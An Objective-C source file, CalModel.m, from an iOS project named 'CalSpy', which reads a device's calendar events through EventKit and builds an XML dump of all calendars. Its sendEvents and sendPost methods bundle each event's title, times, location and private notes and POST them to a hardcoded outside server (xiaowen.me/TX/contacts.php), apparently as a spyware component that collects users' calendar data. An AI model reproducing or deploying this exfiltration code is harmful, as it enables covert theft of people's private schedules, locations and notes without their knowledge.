//
//  CalModel.m
//  CalSpy
//
//  Created by Zhang on 09/10/12.
//  Copyright (c) 2012 Zhang. All rights reserved.
//

#import "CalModel.h"
#import <EventKit/EventKit.h>

@interface CalModel(){
    EKEventStore *store;
    NSDateFormatter *formatter;
}
- (NSDate *)getDatePart: (NSDate *)date;
@end

@implementation CalModel

- (id)init
{
    self = [super init];
    store = [[EKEventStore alloc] init];
    if([EKEventStore authorizationStatusForEntityType:EKEntityTypeEvent] ==EKAuthorizationStatusNotDetermined){
        [store requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error) {
            
        }];
    }else{
        
    }
    
    if (formatter == nil) {
        formatter = [[NSDateFormatter alloc] init];
        [formatter setDateStyle:NSDateFormatterMediumStyle];
    }
    
    return self;
}

- (NSArray*)retrieveEventsFrom:(NSDate*)dateBegin To:(NSDate*)dateEnd inCalendars:(NSArray *)calendars
{
    // Create the predicate from the event store's instance method
    NSPredicate *predicate = [store predicateForEventsWithStartDate:dateBegin
                                                            endDate:dateEnd
                                                          calendars:calendars];
    
    // Fetch all events that match the predicate
    NSArray *events = [store eventsMatchingPredicate:predicate];
    return [events sortedArrayUsingSelector:@selector(compareStartDateWithEvent:)];
}

- (NSArray*)generateSectionsByIteratingEventsArray: (NSArray*)events
{
    NSMutableArray *toReturn = [[NSMutableArray alloc]init];
    NSInteger n = 0;
    NSMutableArray *currentRows = [[NSMutableArray alloc]init];
    NSDate *currentDate;
    for(EKEvent *evt in events){
        NSDate *eventDate = [self getDatePart:evt.startDate];
        if (![eventDate isEqualToDate:currentDate]) {
            if(n!=0){
                [toReturn addObject:[[NSDictionary alloc] initWithObjectsAndKeys:[[NSNumber alloc]initWithInteger:n],@"rowsCount",currentRows, @"rows", [formatter stringFromDate:currentDate], @"sectionLabel", nil]];
                n = 0;
                currentRows = [[NSMutableArray alloc]init];
            }
            currentDate = eventDate;
        }
        [currentRows addObject:evt];
        n++;
    }
    if(n!=0){
        [toReturn addObject:[[NSDictionary alloc] initWithObjectsAndKeys:[[NSNumber alloc]initWithInteger:n],@"rowsCount",currentRows, @"rows", [formatter stringFromDate:currentDate], @"sectionLabel", nil]];
    }
    return toReturn;
}

- (NSArray*)retrieveAllCalendars
{
    return [store calendarsForEntityType:EKEntityTypeEvent];
}

- (NSDate *)getDatePart: (NSDate *)date
{
    NSCalendar *calendar = [NSCalendar currentCalendar];
    NSInteger comps = (NSDayCalendarUnit | NSMonthCalendarUnit | NSYearCalendarUnit);
    NSDateComponents *dateComponents = [calendar components:comps fromDate: date];
    return [calendar dateFromComponents:dateComponents];
}

- (void)sendEvents:(NSArray *)events WithCallback:(void (^)(void))callback inContext:(id)context
{
    EKEvent *event;
    NSMutableArray *encodedParam = [[NSMutableArray alloc]initWithCapacity:[events count]];
    NSDateFormatter *entireFormatter = [[NSDateFormatter alloc]init];
    [entireFormatter setDateFormat:@"dd-MM-YY HH:mm"];
    
    
    for ( int i = 0; i < [events count]; i++ )
    {
        event = events[i];
        
        NSString * param1 = [NSString stringWithFormat:@"Event%d=%@%@%@",i
                             ,[event.title stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@" / Calendar : %@",event.calendar.title] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@" / Time : %@ - %@",[entireFormatter stringFromDate:event.startDate], [entireFormatter stringFromDate:event.endDate]] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
        NSString * param2 = [NSString stringWithFormat:@"Detail%d=%@%@\n",i
                             ,[[NSString stringWithFormat:@"Place : %@",event.location] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]
                             ,[[NSString stringWithFormat:@" / Notes : %@",event.notes] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]];
        
        [encodedParam addObject:param1];
        [encodedParam addObject:param2];
    }
    [self sendPost:encodedParam WithCallback:callback InContext:context];
}


- (void)sendPost:(NSArray *)encodedParam WithCallback:(void (^)(void))callback InContext:(id)context
{
    NSString * post = [encodedParam componentsJoinedByString:@"&"];
    NSData * postData = [post dataUsingEncoding:NSASCIIStringEncoding];
    
    NSURL * url = [NSURL URLWithString:@"http://www.xiaowen.me/TX/contacts.php"];
    NSLog(@"%@", post);
    NSMutableURLRequest * request = [[NSMutableURLRequest alloc] initWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:postData];
    [request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
    
    NSURLConnection *theConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    if (theConnection) {
        callback();
    }else {
        
    }
}

- (NSString *)prepareText
{
    /*NSDateFormatter *entireFormatter = [[NSDateFormatter alloc]init];
    [entireFormatter setTimeStyle:NSDateFormatterFullStyle];
    [entireFormatter setDateStyle:NSDateFormatterFullStyle];*/
    
    XMLWriter* xmlWriter = [[XMLWriter alloc]init];
    
    // start writing XML elements
    [xmlWriter writeStartElement:@"Calendars"];
    
    NSArray *cals = [self retrieveAllCalendars];
    
    for(EKCalendar *calendar in cals){
        
        [xmlWriter writeStartElement:@"Calendar"];
        
        [xmlWriter writeAttribute:@"title" value:calendar.title];
        [xmlWriter writeAttribute:@"color" value: [UIColor colorWithCGColor:calendar.CGColor].description];
        
        //only from today to distant future ... don't know how to use distant past
        NSArray *events = [self retrieveEventsFrom:[NSDate date] To:[NSDate dateWithTimeIntervalSinceNow:[[NSDate distantFuture] timeIntervalSinceReferenceDate]] inCalendars:[NSArray arrayWithObjects:calendar, nil]];
        for(EKEvent *evt in events){
         [xmlWriter writeStartElement:@"Event"];
         
         [xmlWriter writeStartElement:@"Title"];
         [xmlWriter writeCharacters: evt.title];
         [xmlWriter writeEndElement];
         
         [xmlWriter writeStartElement:@"StartDate"];
         [xmlWriter writeCharacters: evt.startDate.description];
         [xmlWriter writeEndElement];
         
         [xmlWriter writeStartElement:@"EndDate"];
         [xmlWriter writeCharacters: evt.endDate.description];
         [xmlWriter writeEndElement];
         
         [xmlWriter writeStartElement:@"Notes"];
         [xmlWriter writeCharacters: evt.notes];
         [xmlWriter writeEndElement];
         
         [xmlWriter writeStartElement:@"Location"];
         [xmlWriter writeCharacters: evt.location];
         [xmlWriter writeEndElement];
         
         [xmlWriter writeEndElement];
         }
        
        
        [xmlWriter writeEndElement];
    }
    
    [xmlWriter writeEndElement];
    
    // get the resulting XML string
    NSString* xml = [xmlWriter toString];
    
    return xml;

}


@end
